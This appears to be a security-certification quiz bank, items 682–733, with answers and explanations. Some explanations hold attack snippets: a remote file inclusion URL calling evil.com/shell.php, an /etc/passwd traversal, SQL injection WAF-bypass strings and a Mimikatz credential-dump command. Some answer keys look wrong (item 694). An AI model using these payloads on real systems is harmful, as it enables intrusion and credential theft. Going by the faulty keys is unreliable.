  {id:682,domain:T,question:"What is a roaming adversary (threat hunter vs. threat intelligence)?",options:["Using geographically distributed infrastructure to obscure attribution","Searching internally versus external threat context","Compromising Windows roaming profiles for persistence","A portable wireless red-team testing platform"],answer:1,explanation:"Threat hunting assumes breach and searches production data; threat intelligence provides external knowledge about who's likely attacking and how to recognize them.",optionExplanations:["Distributed infrastructure is an OPSEC technique, not the hunting-versus-intelligence distinction.","Threat hunting searches internally for a hidden attacker, unlike external threat intelligence.","Roaming profile compromise is a specific persistence technique, unrelated to this distinction.","Portable red-team platforms are testing tools, unrelated to hunting versus intelligence."]},
  {id:683,domain:A,question:"What is a security configuration baseline's relationship to CIS Benchmarks?",options:["Consistently stricter than typical organizational baselines require","Identical settings copied into every baseline","Community security configs adopted as baselines","Proprietary, paid-membership-only resources"],answer:2,explanation:"CIS Benchmark for Windows Server 2022 provides 900+ specific hardening settings — organizations use these as their baseline, potentially adjusting for business requirements.",optionExplanations:["CIS Benchmarks aren't inherently stricter than every custom baseline; organizations may adjust them.","Baselines are often customized, not identical copies of published benchmarks.","CIS Benchmarks are community-developed configurations organizations adopt as baselines.","CIS Benchmark documents are freely available, not restricted to paying members."]},
  {id:684,domain:P,question:"What is a data subject's right to object under GDPR?",options:["Contesting decisions made entirely through automated processing","Objecting to marketing or legitimate-interest processing","Filing complaints with supervisory data authorities","Blocking all future data collection outright"],answer:1,explanation:"Direct marketing objections must always be honored; legitimate interest objections require a balancing — compelling legitimate grounds can override the objection but must be demonstrated.",optionExplanations:["Automated decision-making rights fall under a separate GDPR article from this one.","The right to object applies to legitimate-interest, marketing, and research processing.","Filing supervisory complaints is a separate right from directly objecting to a controller.","The right to object has specific conditions, not a blanket block on all collection."]},
  {id:685,domain:G,question:"What is a Schnorr signature scheme?",options:["A lattice-based post-quantum signature scheme","A MAC algorithm by Bruce Schneier","An efficient discrete-log scheme enabling signature aggregation","A high-throughput scheme with larger signatures"],answer:2,explanation:"Schnorr signatures enable MuSig (multi-signature aggregation) in Bitcoin Taproot — multiple signers produce a single compact signature indistinguishable from a single-signer signature.",optionExplanations:["Lattice-based schemes are post-quantum designs, unlike Schnorr's classical discrete-log basis.","Bruce Schneier is a different cryptographer known for Blowfish and Twofish.","Schnorr signatures use discrete logarithms and support efficient signature aggregation.","Schnorr signatures are actually smaller than DSA, not larger."]},
  {id:686,domain:T,question:"What is a time-based one-time password (TOTP)?",options:["A one-time code delivered via SMS text","Marking stored passwords as expired","A fixed schedule for password rotation","A time-and-secret-based short-lived MFA code"],answer:3,explanation:"TOTP (RFC 6238) — used in Google Authenticator, Authy, Microsoft Authenticator — generates codes by combining the shared secret with Unix timestamp divided into 30-second windows.",optionExplanations:["SMS delivery is out-of-band, unlike TOTP's locally computed codes.","Password expiration is a credential policy, unrelated to time-based code generation.","Mandatory rotation schedules are password policy, distinct from second-factor code generation.","TOTP generates a short-lived code from a shared secret and current time."]},
  {id:687,domain:A,question:"What is a security token service (STS)?",options:["Issuing SAML, OAuth, and JWT tokens","A vendor service provisioning hardware OTP tokens","Manufacturing and shipping physical hardware security keys","A kiosk dispensing RFID visitor cards"],answer:0,explanation:"AWS STS, Azure Active Directory, and corporate SSO providers act as STS — issuing short-lived tokens that applications accept without each application managing credentials independently.",optionExplanations:["An STS issues and validates digital tokens like SAML, OAuth, and JWT.","Hardware token provisioning is a vendor supply function, distinct from digital token issuance.","Physical key manufacturing is a hardware vendor task, not a token-issuing service.","Visitor card kiosks are physical access control, unrelated to digital security tokens."]},
  {id:688,domain:O,question:"What is a security playbook?",options:["A checkpoint reference card for security guards","A narrative strategy document with no procedures","A high-level vision and budget plan","Step-by-step procedures for specific incidents"],answer:3,explanation:"Playbooks for ransomware, phishing, data breach, and insider threat ensure every analyst follows the same effective procedure — critical for consistency when handling incidents under pressure.",optionExplanations:["Physical checkpoint reference cards support guards, not cybersecurity incident response.","Strategy narratives describe philosophy, not the actionable procedures a playbook provides.","High-level planning documents describe direction, not specific incident procedures.","A playbook provides step-by-step procedures for handling specific incident types."]},
  {id:689,domain:T,question:"What is a dumpster diving attack?",options:["Searching physical trash and recycling for sensitive documents","Heat exhaust disrupting nearby wireless signals","Exploiting SCADA in waste-management systems","Luring victims to low-quality websites"],answer:0,explanation:"Organizations discard sensitive documents (shredder bypass), USB drives, hard drives, and old servers in trash — attackers recover account numbers, passwords written on sticky notes, and confidential memos.",optionExplanations:["Dumpster diving searches discarded trash for sensitive documents or media.","HVAC interference with wireless signals is unrelated to physically searching trash.","SCADA attacks on waste infrastructure are ICS incidents, not physical trash searching.","Content misdirection attacks exploit attention, unrelated to physically searching discarded waste."]},
  {id:690,domain:G,question:"What is the difference between asymmetric encryption's public and private keys?",options:["Public keys always compute faster than private keys","Public keys encrypt; private keys decrypt","Public keys are always longer than private keys","Either key can encrypt or decrypt data"],answer:1,explanation:"The mathematical relationship between RSA keys (based on prime factorization difficulty) means you can freely distribute the public key without compromising the private key's security.",optionExplanations:["Speed can differ, but the defining distinction is functional role, not computation speed.","Public keys encrypt or verify, while private keys decrypt or sign.","Key length depends on the algorithm, not a fixed rule about public versus private.","The two keys have fixed, distinct roles, not interchangeable functions."]},
  {id:691,domain:T,question:"What is a watering hole attack's defense strategy?",options:["Restricting browsing to an approved vendor list","Deploying honeypot sites to lure watering-hole attackers","Browser hardening, filtering, and endpoint monitoring","Blocking all non-allowlisted websites entirely"],answer:2,explanation:"Defense: patch browsers and plugins immediately, use browser sandboxing (Chrome, Edge), deploy network proxies with SSL inspection, and monitor endpoint behavior for post-exploit activities.",optionExplanations:["Approved-site restrictions are impractical and don't address already-trusted compromised sites.","Honeypots can deceive attackers but don't protect employees visiting real compromised sites.","Layered browser hardening, filtering, and endpoint monitoring defend against watering holes.","Blanket blocking is operationally impractical for most organizations' daily work."]},
  {id:692,domain:A,question:"What is a security architecture review?",options:["A procurement evaluation of competing vendor products","A data-center floor-plan evaluation","Evaluating a design for security flaws","A physical building-hardening assessment"],answer:2,explanation:"Architecture reviews catch flaws early — identifying that a proposed API design lacks rate limiting or that a data flow routes customer PII through unsecured third-party systems.",optionExplanations:["Vendor product evaluation supports procurement, not reviewing a system's own design.","Floor-plan evaluation addresses physical layout, unrelated to system design security.","An architecture review evaluates a system's design for flaws before implementation.","Physical building hardening assessments address facility security, not system architecture."]},
  {id:693,domain:O,question:"What is a purple team's output compared to a red team engagement?",options:["Only attacker-perspective vulnerability reports","Detection improvements and control gaps found during testing","Reports identical to standard red-team findings","Color-coded dashboards of attack paths"],answer:1,explanation:"Purple team reports map TTPs to ATT&CK, show what was detected vs. missed, and provide specific SIEM rule recommendations — enabling measurable defensive improvement.",optionExplanations:["Attacker-only findings describe standard red team output, not purple team's defensive focus.","Purple team output highlights detection gaps and specific control improvements.","Purple team reports differ from red team reports by emphasizing defensive lessons.","The 'purple' name reflects combined perspectives, not literal color-coded dashboards."]},
  {id:694,domain:P,question:"What is a data minimization impact on cybersecurity risk?",options:["Collecting more comprehensive data improves security monitoring accuracy","No measurable effect on organizational risk","Less data collected means smaller breach impact","Only reduces storage costs, nothing else"],answer:1,explanation:"You can't breach data you don't collect — an organization that collects only email and purchase history exposes far less in a breach than one that also collects SSNs, birthdates, and medical history.",optionExplanations:["Security monitoring relies on telemetry, not personal data volume, so this is unrelated.","Data minimization does reduce breach severity, contrary to having no effect.","Collecting less personal data reduces the harm and exposure of a breach.","Minimization also reduces breach harm to individuals, not just storage costs."]},
  {id:695,domain:G,question:"What is a cipher suite in TLS?",options:["A secured office for cryptographers and key staff","Named algorithms for key exchange and encryption","A bundle of CA root certificates","A software bundle of crypto utilities"],answer:1,explanation:"TLS_AES_256_GCM_SHA384 specifies: TLS protocol, AES-256-GCM for authenticated encryption, SHA-384 for PRF — TLS 1.3 simplified to only 5 cipher suites, all providing perfect forward secrecy.",optionExplanations:["Secure physical facilities are a personnel security control, unrelated to TLS parameters.","A cipher suite names the algorithms used for key exchange and encryption in TLS.","CA certificate bundles are PKI trust anchors, distinct from TLS algorithm negotiation.","Software utility bundles are tools, not the specific TLS negotiation parameter."]},
  {id:696,domain:T,question:"What is an insider threat detection indicator?",options:["A physical badge or uniform seen on-site","Unusual access patterns or bulk downloads","An external attack later tied to an insider","An employee reporting suspicious activity directly"],answer:1,explanation:"UEBA (User and Entity Behavior Analytics) tools detect anomalies: an accountant accessing R&D files at 2am, mass email of company files to personal account, or printing thousands of pages before resignation.",optionExplanations:["Physical badges are unrelated to behavioral indicators of insider data exfiltration.","Unusual access patterns and bulk downloads are behavioral insider threat indicators.","External attack attribution is a different investigative exercise from behavioral indicators.","A reporting employee is a witness providing a tip, not the indicator itself."]},
  {id:697,domain:A,question:"What is a WAF bypass technique?",options:["Only during authorized pentest engagements","Tuning existing WAF rule sets","Encoding, obfuscating, or exploiting gaps in WAF rules","Physically unplugging the WAF appliance"],answer:2,explanation:"SQL injection bypasses: '/*!50000UNION*/SELECT' (MySQL comments), URL double encoding '%2527', or using equivalent syntax ('1' AND '1'='1' vs '1' OR '1'='1') that achieves the same injection.",optionExplanations:["Authorization context doesn't define the bypass technique itself.","Rule tuning is a defensive maintenance activity, not an attacker's evasion method.","WAF bypasses use encoding, obfuscation, or rule gaps to evade detection.","Physically disconnecting an appliance is unrelated to application-layer evasion techniques."]},
  {id:698,domain:O,question:"What is a security gap in the MITRE ATT&CK framework context?",options:["Attacker behaviors MITRE hasn't catalogued yet","An unmonitored loading dock or propped door","Techniques with no detection coverage","Unfinished sections of MITRE's own documentation"],answer:2,explanation:"ATT&CK coverage analysis reveals: 'We have 60% coverage of Execution techniques but only 20% of Defense Evasion — attackers can bypass defenses without any detection.'",optionExplanations:["Uncatalogued behavior is a research gap for MITRE, not an organizational detection gap.","Physical perimeter weaknesses are facilities issues, unrelated to ATT&CK detection coverage.","A security gap is an ATT&CK technique the organization can't detect.","Documentation completeness is MITRE's publishing task, not an organizational detection blind spot."]},
  {id:699,domain:T,question:"What is a social engineering toolkit (SET)?",options:["A coaching toolkit for interpersonal and public-speaking skills","Privacy checklists for social-media accounts","A framework for phishing and credential harvesting","Slideshow decks for phishing-awareness training"],answer:2,explanation:"SET (Social Engineering Toolkit by TrustedSec) is used in authorized red team engagements to test human security controls — spear phishing campaigns, website cloning, and SMS attacks.",optionExplanations:["Soft-skills coaching materials are unrelated to offensive security tooling.","Personal privacy checklists protect individual accounts, distinct from red-team attack frameworks.","SET is a framework used to simulate phishing and credential harvesting attacks.","Awareness training content teaches recognition after the fact, not the offensive tool itself."]},
  {id:700,domain:G,question:"What is a preimage resistance property of hash functions?",options:["An image pipeline's resistance to crashing on bad files","Unpredictability in how hash bytes look","No feasible way to reverse a hash","Generating thumbnails from larger source photos"],answer:2,explanation:"MD5 lacks preimage resistance for short inputs — given MD5('password')='5f4dcc3b5aa765d61d8327deb882cf99', finding 'password' from the hash must be computationally infeasible.",optionExplanations:["Crash resistance in a software pipeline is unrelated to cryptographic hash properties.","Byte-appearance unpredictability differs from the specific inability to reverse a hash.","Preimage resistance means it's infeasible to find any input matching a given hash.","Thumbnail generation is a media-processing concept, unrelated to preimage resistance."]},
  {id:701,domain:O,question:"What is the purpose of a cyber range?",options:["Regional office jurisdiction boundary","Physical firearms training range","Security tool license inventory","Simulated network environment for hands-on security training"],answer:3,explanation:"Cyber ranges (SANS NetWars, National Cyber Range) enable realistic attack-and-defend exercises — participants practice incident response against real attack tools in isolated, consequence-free environments.",optionExplanations:["This describes an administrative geographic boundary, not a technical training environment.","This is physical weapons training, unrelated to virtual cybersecurity exercises.","This is asset tracking of tools and licenses, not a training platform.","Cyber ranges replicate real infrastructure so teams can practice attacks and defenses without risking production systems."]},
  {id:702,domain:T,question:"What is a FIDO2 (WebAuthn) authentication method?",options:["Federal employee identity program","Legacy 2G SIM authentication","SMS-based one-time passcode","Passwordless authentication"],answer:3,explanation:"FIDO2 eliminates phishing — credentials are domain-bound and never leave the device. Even if tricked onto a phishing site, the key won't authenticate because the domain doesn't match.",optionExplanations:["FIDO2 is an open industry standard, not a government-only identity program.","2G SIM authentication is legacy cellular tech unrelated to FIDO2.","SMS codes are phishable; FIDO2 instead binds credentials cryptographically to the site.","FIDO2 uses hardware keys or biometrics with cryptographic challenge-response, resisting phishing."]},
  {id:703,domain:A,question:"What is a network tap vs. a network span (mirror) port?",options:["Hardware tap: passive inline copy","Wireless-only vs wired-only monitoring","Span ports are always superior","Tap is pricier hardware, span is free software"],answer:0,explanation:"Taps guarantee full-duplex packet capture at any traffic level; span ports can drop packets when switch processors are busy — critical for forensics and intrusion detection requiring complete traffic visibility.",optionExplanations:["A tap physically copies all traffic without relying on switch software, avoiding dropped packets.","Both taps and span ports monitor wired traffic; neither is wireless-only.","Span ports can drop packets under load, so they are not more reliable than taps.","Cost is a secondary factor; the real distinction is reliability under high traffic load."]},
  {id:704,domain:P,question:"What is third-party risk management in privacy?",options:["Outsourcing the entire risk program","Managing unapproved employee app installs","Vendor data-sharing privacy risk","External audit of internal privacy"],answer:2,explanation:"GDPR Article 28 requires data processing agreements with processors; third-party risk programs audit vendor security, review DPAs, and assess whether vendors' privacy practices meet organizational and regulatory standards.",optionExplanations:["Outsourcing risk management entirely is a staffing decision, not vendor privacy oversight.","Unapproved app installs are a shadow-IT issue, not vendor risk management.","Third-party risk management evaluates privacy risks from sharing data with vendors and partners.","An external audit of one's own practices is not the same as ongoing vendor oversight."]},
  {id:705,domain:G,question:"What is RSA encryption and its key size requirements?",options:["Symmetric 512-bit fixed cipher","Royal Security Algorithm at 256-bit","Asymmetric factoring-based algorithm needing 2048+ bit keys","Symmetric algorithm sold by RSA Security"],answer:2,explanation:"RSA-1024 is considered broken; RSA-2048 is current minimum; RSA-4096 is preferred for sensitive/long-lived keys — keys must be much larger than symmetric because the mathematical problem is harder to scale.",optionExplanations:["RSA is asymmetric and supports multiple key sizes, not one fixed 512-bit symmetric key.","RSA has no such government branding or fixed 256-bit mandate.","RSA's security relies on factoring large primes, requiring 2048+ bit keys for modern security.","RSA uses public/private key pairs, not a single shared symmetric secret."]},
  {id:706,domain:T,question:"What is a network packet injection attack?",options:["Authorized performance-testing packets","Prioritizing latency-sensitive traffic","Forged packets hijacking a session","Physical cable tapping"],answer:2,explanation:"TCP injection can hijack sessions (inject commands into an SSH session), dereference ARP tables, or disrupt connections — requires on-path position or network-level access.",optionExplanations:["Benchmarking uses legitimate authorized tools, not forged malicious packets.","Injection disrupts traffic rather than prioritizing it for speed.","Attackers insert forged packets to hijack sessions or inject commands into a stream.","Physical cable tapping is passive interception, not active packet forgery."]},
  {id:707,domain:A,question:"What is a privileged identity management (PIM) solution?",options:["Login-timestamp monitoring dashboard across every system","HR career-tracking system","Basic shared password manager","Just-in-time privileged access control"],answer:3,explanation:"CyberArk, BeyondTrust, and Azure PIM vault privileged credentials, require approval for access, record sessions, and auto-rotate passwords — dramatically reducing privileged account compromise risk.",optionExplanations:["Timestamp logging is one narrow function, not the full privileged access lifecycle.","HR career tracking is unrelated to technical privileged account management.","A basic password manager lacks approval workflows and session recording that PIM provides.","PIM vaults credentials, requires approval for access, and records privileged sessions."]},
  {id:708,domain:O,question:"What is cyber deception technology's key operational benefit?",options:["Demoralizing attackers psychologically","Classroom incident-response training","High-fidelity, low-noise alerts","Inflating executive security reports"],answer:2,explanation:"A honeypot alert has near-zero false positives — no legitimate user has any reason to access it. Compare to SIEM alerts with 95%+ false positive rates — deception alerts require immediate attention.",optionExplanations:["Psychological effects are a side benefit, not the core operational value.","Deception assets are deployed live in production, not used for classroom rehearsal.","Any interaction with a decoy asset is inherently suspicious, producing near-zero false positives.","Deception technology informs leadership accurately rather than inflating security posture reports."]},
  {id:709,domain:T,question:"What is a watering hole attack's attribution challenge?",options:["Consistent, easily traced signature","Trivial once the site is found","Water contamination cannot be traced","Minimal forensic trail across compromised intermediary sites"],answer:3,explanation:"Attribution requires: compromise the intermediary website, find the injected code, reverse engineer it, trace infrastructure — multiple hops create distance that makes attacker attribution difficult and time-consuming.",optionExplanations:["Sophisticated attackers avoid distinctive signatures to complicate attribution.","Finding the compromised site is only the first step of a longer investigation.","This is an unrelated literal metaphor, not a forensic investigation concept.","Attackers use compromised intermediary sites, creating distance that makes tracing back to them difficult."]},
  {id:710,domain:G,question:"What is an S/MIME email security standard?",options:["Gateway attachment malware scanning","Legacy plain-text email formatting","Public-key email encryption and signing","Open-relay hardening configuration standard"],answer:2,explanation:"S/MIME encrypts email content end-to-end using recipient's public key (only recipient can decrypt) and signs messages with sender's private key (recipient verifies sender authenticity).",optionExplanations:["Attachment scanning is a mail gateway function, not cryptographic email protection.","S/MIME provides encryption and signatures, not just plain-text formatting.","S/MIME encrypts and digitally signs email content using public-key cryptography.","Open-relay hardening is a server configuration issue, unrelated to S/MIME."]},
  {id:711,domain:T,question:"What is a cross-site scripting (XSS) stored vs. reflected attack?",options:["Reflected is always more dangerous","Stored only lives in RAM","Stored script persists in the database","Same vulnerability, different marketing names"],answer:2,explanation:"Stored XSS in a forum post infects every visitor; reflected XSS requires the victim to click a crafted link containing the script in the URL parameter — stored XSS has much larger impact.",optionExplanations:["Stored XSS is typically more impactful since it affects every visitor automatically.","Memory persistence isn't the distinction; it's where the script is saved.","Stored XSS saves malicious script in the database, executing for every visitor.","Stored and reflected XSS are distinct attack types with different impact profiles."]},
  {id:712,domain:A,question:"What is a data loss prevention (DLP) system?",options:["Security-staff retention program","Blocks unauthorized data movement","Mobile device loss-prevention tool","Backup and disaster-recovery system"],answer:1,explanation:"DLP (Symantec, Forcepoint, Microsoft Purview) detects when someone emails a file with 16-digit credit card numbers, blocks it, and alerts the security team — enforcing data handling policies automatically.",optionExplanations:["Staff retention is an HR initiative, unrelated to protecting sensitive data.","DLP monitors and blocks unauthorized transmission of sensitive data across channels.","MDM protects devices, while DLP protects data content based on classification.","Backup systems prevent data loss from failure, not intentional exfiltration."]},
  {id:713,domain:O,question:"What is a mean time between failures (MTBF) metric's security relevance?",options:["Time between cyber attacks","Time between logged incidents","SOC staff burnout measure","Hardware reliability metric for security appliances like firewalls"],answer:3,explanation:"Security appliances with low MTBF create availability risks — a failed IPS creates unmonitored network segments; redundancy (HA pairs) mitigates this but increases cost.",optionExplanations:["Attack frequency is a threat-intel metric, not a hardware reliability measure.","Incident frequency tracks breaches, a different concept from hardware failure rate.","Burnout is an HR concern measured through surveys, not hardware metrics.","MTBF measures how often security hardware fails, informing redundancy planning."]},
  {id:714,domain:P,question:"What is a data protection authority (DPA) under GDPR?",options:["Independent EU regulatory body","Commercial database-protection software","Any private data-adequacy certifier","Internal company compliance department"],answer:0,explanation:"National DPAs (ICO in UK, CNIL in France, BfDI in Germany) enforce GDPR — they investigate complaints, conduct audits, issue guidance, and impose fines up to €20 million or 4% of global turnover.",optionExplanations:["DPAs are the governmental GDPR enforcement bodies in each EU member state.","A database security product is commercial software, not a regulator.","DPAs are specifically designated public regulators, not private certifying bodies.","An internal department reviews its own practices; a DPA is an external regulator."]},
  {id:715,domain:G,question:"What is ChaCha20-Poly1305?",options:["Cocktail-themed block cipher","Fast AEAD alternative to AES-GCM","Fixed twenty-round sixteen-byte cipher","AES variant with longer blocks"],answer:1,explanation:"ChaCha20-Poly1305 is faster than AES-GCM on devices without dedicated AES instructions (most ARM processors before AES-NI) — used in TLS 1.3, WireGuard, and QUIC protocols.",optionExplanations:["The name isn't derived from cocktails; it's a stream cipher by Daniel Bernstein.","ChaCha20 encrypts and Poly1305 authenticates, offering fast AEAD without AES hardware support.","ChaCha is a stream cipher, not a fixed-block cipher like AES.","ChaCha20 is an independently designed stream cipher, not a modified AES variant."]},
  {id:716,domain:T,question:"What is credential theft via memory scraping?",options:["Bulk credential-stuffing from scraped forms","Browser-saved autofill password scraping","Extracting hashes from LSASS memory","Physical memory-chip damage"],answer:2,explanation:"Mimikatz 'sekurlsa::logonpasswords' extracts all logged-in user credentials from LSASS — on unprotected Windows systems, this gives attackers all domain credentials in plaintext or hash form.",optionExplanations:["Credential stuffing reuses breached logins; memory scraping instead pulls live credentials from RAM.","Browser autofill scraping targets locally stored passwords, not process memory.","Tools like Mimikatz pull NTLM hashes and Kerberos tickets directly from LSASS memory.","Physical chip damage is a hardware failure, not a software extraction technique."]},
  {id:717,domain:A,question:"What is a network segmentation control benefit for ransomware?",options:["Limits lateral spread to isolated segments beyond a compromised host","Total immunity to any infection","Automatic detection without extra tools","Prevents ransomware delivery entirely"],answer:0,explanation:"NotPetya spread through flat networks at wired speed; organizations with proper segmentation (restricted SMB between segments) contained the spread while flat-network organizations were completely encrypted.",optionExplanations:["Segmentation blocks ransomware from reaching backup servers or other segments after an initial infection.","Segmentation limits reachability; it doesn't grant total immunity to infection.","Segmentation controls access paths but doesn't itself detect malware activity.","Segmentation doesn't stop initial delivery via phishing; it limits spread afterward."]},
  {id:718,domain:O,question:"What is a security awareness training frequency recommendation?",options:["Continuous reinforcement training","One annual session is sufficient","Reactive training only after incidents","Long monthly comprehensive sessions"],answer:0,explanation:"Annual training alone creates knowledge decay — monthly phishing simulations, quarterly policy reminders, and event-triggered training (new threat, policy change) maintain security awareness throughout the year.",optionExplanations:["Combining periodic baseline training with frequent reinforcement outperforms annual-only training.","Annual-only training leaves knowledge decay unaddressed throughout the year.","Reactive-only training misses prevention opportunities entirely.","Long sessions create fatigue; shorter, frequent touchpoints are more effective."]},
  {id:719,domain:T,question:"What is a kernel rootkit's detection challenge?",options:["Trivial with any rootkit scanner","OS APIs are hooked to hide activity","Trivially caught by standard antivirus","Only slows down detection tools"],answer:1,explanation:"To detect a kernel rootkit, you must boot from external media (bypassing the infected kernel) or use kernel-independent analysis tools that don't rely on OS APIs the rootkit has subverted.",optionExplanations:["Rootkits also subvert dedicated scanners running on the same compromised kernel.","The rootkit hooks OS APIs that detection tools rely on, hiding its own presence.","Rootkits specifically defeat standard antivirus and process monitors by design.","Rootkits falsify what tools report, not merely slow their scanning speed."]},
  {id:720,domain:G,question:"What is the security significance of hash output size?",options:["No bearing on security level","Larger outputs compute faster","Larger outputs mean stronger encryption","Determines collision resistance"],answer:3,explanation:"SHA-256 has 2^128 birthday collision resistance; SHA-3-512 has 2^256 — SHA-1's 160-bit output provided only 2^80 collision resistance, which became feasible with sufficient computational resources.",optionExplanations:["Output size is actually the primary factor in collision resistance.","Speed depends on algorithm and hardware, not output size alone.","Hashing and encryption are different operations; size affects collision resistance, not encryption strength.","A larger output size exponentially raises the effort needed to find a collision."]},
  {id:721,domain:T,question:"What is a Kerberoasting attack?",options:["Online brute-force login guessing","DDoS against Kerberos servers","Cracking offline service-ticket hashes to recover account passwords","Flooding domain controller network ports"],answer:2,explanation:"Any domain user can request service tickets; if the service account has a weak password, offline cracking of the NTLM hash in the ticket recovers the password — then the account is compromised.",optionExplanations:["Online brute force triggers lockouts; Kerberoasting extracts tickets for offline cracking instead.","Kerberoasting doesn't disrupt availability like a DoS attack would.","Service tickets are encrypted with the account's password hash, enabling offline cracking of weak passwords.","Port flooding is a network availability attack, not a credential extraction technique."]},
  {id:722,domain:A,question:"What is an extended validation (EV) certificate?",options:["Doubly encrypted certificate contents","Extended validity period only","Fully automated renewal feature","Rigorous legal identity verification"],answer:3,explanation:"EV certificates require CA verification of legal entity existence, physical address, domain ownership, and authorization — making them harder for phishing sites to obtain legitimately.",optionExplanations:["There's no additional encryption layer; EV refers to identity vetting rigor.","Extended validity period describes expiration length, not verification rigor.","Automatic renewal is a separate lifecycle feature, unrelated to validation level.","EV certificates require rigorous verification of the requesting organization's legal identity."]},
  {id:723,domain:O,question:"What is log correlation in SIEM?",options:["Synchronizing timestamps across sources","Linking events across systems","Fixing malformed log entries","Generating routine compliance summaries"],answer:1,explanation:"SIEM correlation: 'IDS alert on port scan' + 'failed logins on web server' + 'successful login' + 'unusual database query' = likely SQL injection attack — no single event tells the story.",optionExplanations:["Clock synchronization supports correlation but isn't correlation itself.","Correlation connects events across sources to reveal multi-stage attack patterns.","Fixing formatting errors is log housekeeping, not security analysis.","Compliance summaries may use correlated data, but detection is correlation's main purpose."]},
  {id:724,domain:T,question:"What is a file inclusion vulnerability?",options:["Malware bundled in password-protected archives","Including files via unsanitized input","Flaw in archive compression algorithms","Bundling policy docs with source code"],answer:1,explanation:"LFI: '?page=../../../../etc/passwd' reads sensitive files; RFI: '?page=http://evil.com/shell.php' executes attacker's PHP code on the server — both stem from unsanitized file path input.",optionExplanations:["Bundled malicious archives are a different distribution method, not a web app flaw.","LFI reads local server files; RFI executes code from external URLs via unsanitized paths.","Compression algorithm flaws are unrelated to how web apps handle file paths.","Bundling documentation is routine practice, not a security vulnerability."]},
  {id:725,domain:G,question:"What is the role of entropy in password strength?",options:["Just a synonym for length","Any long password has high entropy","Measures unpredictability from character set size and length","How mentally taxing a password feels"],answer:2,explanation:"'password' is 8 characters but low entropy (common word pattern). 'xK9#mQ2$' is also 8 characters but higher entropy (random, mixed character set). Entropy predicts guessing resistance.",optionExplanations:["Length is one input factor, not a synonym for entropy.","A long but predictable password like 'aaaaaaaa' still has low entropy.","Entropy combines character-set size and length to quantify guessing resistance.","Entropy is a mathematical measure, not a subjective difficulty rating."]},
  {id:726,domain:P,question:"What is a cookie consent mechanism under ePrivacy/GDPR?",options:["Cryptographic session-cookie signing","Opt-in consent for tracking cookies","Bakery's promotional cookie order form","Default blanket cookie consent"],answer:1,explanation:"GDPR and ePrivacy Directive require freely given, specific, informed, unambiguous opt-in consent for non-essential cookies — pre-ticked boxes, cookie walls, and implied consent are non-compliant.",optionExplanations:["Session cookie signing is a technical necessity exempt from consent rules.","Non-essential cookies like tracking and ads require informed opt-in consent.","This is unrelated wordplay about baked goods, not web tracking.","Default blanket consent without a real choice violates GDPR requirements."]},
  {id:727,domain:A,question:"What is a virtual LAN (VLAN) and its security function?",options:["Cloud-only network construct","Virtual-machine-only network, no hardware","VPN tunnel between local devices","Segmentation on shared switches"],answer:3,explanation:"VLANs separate HR, Finance, Development, and Guest networks on the same physical switches — VLAN-aware switches enforce separation; inter-VLAN communication requires going through a router/firewall.",optionExplanations:["VLANs run natively on on-premises physical switches, not just in the cloud.","VLANs can include both physical and virtual devices on the same ports.","VPNs create encrypted tunnels; VLANs create data-link-layer isolation on local switches.","VLANs isolate traffic between device groups sharing the same physical infrastructure."]},
  {id:728,domain:O,question:"What is a penetration testing rules of engagement?",options:["Tester dress-code and conduct policy","Public marketing catalog of techniques","CTF tournament scoring rules","Authorized scope and stop conditions"],answer:3,explanation:"Rules of engagement prevent unauthorized testing — explicitly authorizing specific IPs, prohibiting production database modifications, defining blackout periods (no testing during business hours), and emergency abort conditions.",optionExplanations:["Dress code is a general conduct policy, not technical test authorization.","A capability catalog is general marketing, not engagement-specific authorization.","CTF scoring rules apply to games, not real client engagements.","Rules of engagement define scope, permitted techniques, and conditions to halt testing."]},
  {id:729,domain:T,question:"What is a Golden Ticket attack?",options:["Forging TGTs using the stolen KRBTGT hash for persistent domain access","CTF conference trophy award","Vendor backdoor master key","Attack on ticket-printing kiosks"],answer:0,explanation:"Once an attacker has the KRBTGT hash (from DCSync or LSASS dump on a DC), they can create TGTs that impersonate any user, with any group memberships, for any duration — enabling complete persistent domain control.",optionExplanations:["With the KRBTGT hash, attackers forge valid TGTs to impersonate any user indefinitely.","A conference trophy is an event reward, unrelated to Active Directory attacks.","Backdoor master keys are a separate policy debate, not Kerberos ticket forgery.","Physical ticket kiosks are unrelated hardware, not Kerberos infrastructure."]},
  {id:730,domain:G,question:"What is a cryptographic protocol's role in secure communications?",options:["Defines rules for secure key exchange","The component that generates session keys","The literal shared secret key itself","Automatic encryption with no configuration"],answer:0,explanation:"TLS 1.3 specifies: handshake sequence (ClientHello, ServerHello, etc.), permitted cipher suites, key exchange methods, and record protocol for encrypting application data — all parties must implement the same protocol.",optionExplanations:["Protocols like TLS specify the handshake sequence, algorithms, and message order for secure communication.","Key generation happens within the protocol, but the protocol is more than a generator.","The protocol defines how keys are used, but isn't the key material itself.","Protocols define how to achieve security; they aren't automatic magic requiring no setup."]},
  {id:731,domain:T,question:"What is a pass-the-ticket attack?",options:["Reusing stolen Kerberos tickets","Handing over a physical access badge","Forwarding an SMS one-time code","Forged paper transit fare tickets"],answer:0,explanation:"Mimikatz can export valid Kerberos tickets from memory and import them on another machine — the attacker then uses these stolen tickets to access network resources as the original user.",optionExplanations:["Attackers steal valid Kerberos tickets from memory and reuse them without needing a password.","Physical badge handoff is a facility security issue, not a credential attack.","Forwarding a one-time code is a different social-engineering technique.","Transit fare evasion is unrelated to digital Kerberos authentication artifacts."]},
  {id:732,domain:A,question:"What is a microservices security challenge compared to monolithic applications?",options:["Expanded attack surface across many endpoints","Identical security needs as monoliths","Monoliths are always more vulnerable","Microservices are always inherently more secure"],answer:0,explanation:"A monolith has one auth boundary; a 100-service microservices architecture has 100 × (100-1) potential communication paths needing mTLS, authorization, and monitoring — a fundamentally different security challenge.",optionExplanations:["Many inter-service endpoints each need authentication, complicating centralized security control.","Distributed architecture creates fundamentally different requirements than a single monolith.","Monoliths have their own distinct vulnerabilities too, not universally worse.","Microservices aren't inherently more secure just from using newer frameworks."]},
  {id:733,domain:O,question:"What is a security program's governance structure?",options:["Daily operational shift checklist","Physical protection of paper documents","Policy, roles, and oversight framework including board and CISO accountability","Org chart of reporting lines"],answer:2,explanation:"Effective governance: Board sets risk appetite → CISO translates to security strategy → policies flow from strategy → standards and procedures implement policies → audits verify compliance.",optionExplanations:["A shift checklist is one operational task, not the full governance structure.","Physical document protection is a facility control, not governance itself.","Governance defines accountability, policy hierarchy, and oversight from the board down to procedures.","An org chart shows titles and reporting lines, not the full accountability framework."]},
